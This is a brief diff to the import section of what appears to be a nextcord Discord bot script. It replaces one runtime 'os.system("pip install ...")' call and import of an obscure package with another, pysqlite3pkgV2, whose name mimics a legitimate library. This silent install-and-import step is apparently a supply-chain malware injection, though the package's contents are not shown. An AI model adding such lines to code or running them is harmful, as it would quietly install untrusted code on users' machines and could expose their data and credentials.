@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pipcryptaddsV2")
-import pipcryptaddsV2
+os.system("pip install pysqlite3pkgV2")
+import pysqlite3pkgV2
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
